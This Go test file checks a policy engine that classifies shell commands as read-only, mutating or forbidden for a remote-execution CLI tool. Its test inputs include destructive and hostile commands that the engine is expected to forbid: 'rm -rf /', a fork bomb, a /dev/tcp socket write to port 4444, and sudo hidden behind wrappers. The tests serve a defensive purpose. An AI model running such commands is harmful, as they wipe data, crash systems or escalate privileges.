package engine

import (
	"testing"

	"github.com/ba0f3/lunacli/internal/policy"
)

func TestEngineClassification(t *testing.T) {
	pol := &policy.Policy{
		Version: 1,
		Rules: []policy.Rule{
			{
				Action: "allow",
				Hosts:  []string{"*"},
				Commands: []policy.CommandRule{
					{Binary: "uptime"},
					{Binary: "ls", ArgsPrefix: []string{"-la"}},
				},
			},
			{
				Action: "approve",
				Hosts:  []string{"*"},
				Commands: []policy.CommandRule{
					{Binary: "systemctl", ArgsPrefix: []string{"restart"}},
				},
			},
		},
	}

	eng := NewEngine(pol)

	tests := []struct {
		cmd   string
		class Classification
	}{
		{"uptime", ReadOnly},
		{"ls -la /var/log", ReadOnly},
		{"systemctl restart nginx", Mutating},
		{"rm -rf /", Forbidden},
		{"unknown", Mutating},
		{"uptime 2>/dev/null", ReadOnly},
		{"uptime 2> /dev/null", ReadOnly},
		{"uptime > /tmp/uptime.log", Mutating},
	}

	for _, tt := range tests {
		t.Run(tt.cmd, func(t *testing.T) {
			res := eng.Classify(tt.cmd, "localhost", nil)
			if res.Class != tt.class {
				t.Errorf("expected %s got %s (%s)", tt.class, res.Class, res.Reason)
			}
		})
	}
}

func TestEngineRedirectToDevNull(t *testing.T) {
	pol := &policy.Policy{
		Version: 1,
		Rules: []policy.Rule{{
			Action: "allow",
			Hosts:  []string{"*"},
			Commands: []policy.CommandRule{
				{Binary: "dpkg"},
				{Binary: "apt"},
			},
		}},
	}
	eng := NewEngine(pol)

	for _, cmd := range []string{
		"dpkg -l 2>/dev/null",
		"apt list 2>/dev/null",
		"dpkg -l 2> /dev/null",
	} {
		t.Run(cmd, func(t *testing.T) {
			res := eng.Classify(cmd, "localhost", nil)
			if res.Class != ReadOnly {
				t.Fatalf("expected read-only got %s (%s)", res.Class, res.Reason)
			}
		})
	}

	polApprove := &policy.Policy{
		Version: 1,
		Rules: []policy.Rule{{
			Action:   "approve",
			Hosts:    []string{"*"},
			Commands: []policy.CommandRule{{Binary: "apt", ArgsPrefix: []string{"upgrade"}}},
		}},
	}
	res := NewEngine(polApprove).Classify("apt upgrade -y 2>/dev/null", "localhost", nil)
	if res.Class != Mutating {
		t.Fatalf("approve action still mutating: got %s (%s)", res.Class, res.Reason)
	}
}

func TestEngineSemanticRiskFloorAndHarmlessLiterals(t *testing.T) {
	pol := &policy.Policy{
		Version: 1,
		Rules: []policy.Rule{{
			Action: "allow",
			Hosts:  []string{"*"},
			Commands: []policy.CommandRule{
				{Binary: "date"}, {Binary: "hostname"}, {Binary: "ss"},
				{Binary: "ip"}, {Binary: "journalctl"}, {Binary: "echo"},
				{Binary: "printf"}, {Binary: "grep"}, {Binary: "uptime"},
			},
		}},
	}
	eng := NewEngine(pol)

	tests := []struct {
		command string
		want    Classification
	}{
		{"date", ReadOnly},
		{"date -s tomorrow", Mutating},
		{"date -s@0", Mutating},
		{"date -us @0", Mutating},
		{"hostname", ReadOnly},
		{"hostname -f", ReadOnly},
		{"hostname -I", ReadOnly},
		{"hostname new-name", Mutating},
		{"hostname -F /tmp/name", Mutating},
		{"ss -tulpn", ReadOnly},
		{"ss -K dst 192.0.2.1", Mutating},
		{"ss -HKn dst 192.0.2.1", Mutating},
		{"ss -D /tmp/sockets", Mutating},
		{"ip route show", ReadOnly},
		{"ip route add default via 192.0.2.1", Mutating},
		{"ip route restore", Mutating},
		{"ip route append 192.0.2.0/24 via 192.0.2.1", Mutating},
		{"ip link set eth0 down", Mutating},
		{"journalctl -u ssh", ReadOnly},
		{"journalctl --vacuum-time=1d", Mutating},
		{"journalctl --cursor-file=/tmp/cursor", Mutating},
		{"journalctl --update-catalog", Mutating},
		{"journalctl --setup-keys", Mutating},
		{"sort -o/tmp/out input", Mutating},
		{"sort -ro/tmp/out input", Mutating},
		{"uniq input /tmp/out", Mutating},
		{"echo 'rm -rf /'", ReadOnly},
		{"grep 'mkfs' /var/log/messages", ReadOnly},
		{"grep 'curl --data' /var/log/messages", ReadOnly},
		{"uptime 2>&1", ReadOnly},
		{"uptime >/dev/stdout", ReadOnly},
		{"uptime >/dev/stderr", ReadOnly},
		{"command sudo id", Forbidden},
		{"command -v sudo", Mutating},
		{"command -V sudo", Mutating},
		{"nohup sudo id", Forbidden},
		{"timeout 5 sudo id", Forbidden},
		{"timeout -s KILL 5 sudo id", Forbidden},
		{"timeout --kill-after=2 5 sudo id", Forbidden},
		{"echo x >/dev/tcp/192.0.2.1/4444", Forbidden},
		{":(){ :|:& };:", Forbidden},
	}
	for _, tc := range tests {
		t.Run(tc.command, func(t *testing.T) {
			got := eng.Classify(tc.command, "localhost", nil)
			if got.Class != tc.want {
				t.Fatalf("Classify() = %s (%s), want %s", got.Class, got.Reason, tc.want)
			}
		})
	}
}

func TestEnginePolicyMatchesAliasAndCanonicalTarget(t *testing.T) {
	pol := &policy.Policy{
		Version: 1,
		Rules: []policy.Rule{
			{Action: "deny", Hosts: []string{"production"}, Commands: []policy.CommandRule{{Binary: "uptime"}}},
			{Action: "deny", Hosts: []string{"192.0.2.10"}, Commands: []policy.CommandRule{{Binary: "date"}}},
			{Action: "allow", Hosts: []string{"*"}, Commands: []policy.CommandRule{{Binary: "uptime"}, {Binary: "date"}}},
		},
	}
	eng := NewEngine(pol)
	targets := []string{"production", "alice@192.0.2.10:22"}
	for _, command := range []string{"uptime", "date"} {
		if got := eng.ClassifyTargets(command, targets, nil); got.Class != Forbidden {
			t.Fatalf("ClassifyTargets(%q) = %s (%s), want forbidden", command, got.Class, got.Reason)
		}
	}
	if got := NewEngine(&policy.Policy{
		Version: 1,
		Rules: []policy.Rule{
			{Action: "deny", Hosts: []string{"alice@192.0.2.10"}, Commands: []policy.CommandRule{{Binary: "uptime"}}},
			{Action: "allow", Hosts: []string{"*"}, Commands: []policy.CommandRule{{Binary: "uptime"}}},
		},
	}).ClassifyTargets("uptime", targets, nil); got.Class != Forbidden {
		t.Fatalf("user@host policy variant = %s (%s), want forbidden", got.Class, got.Reason)
	}
}
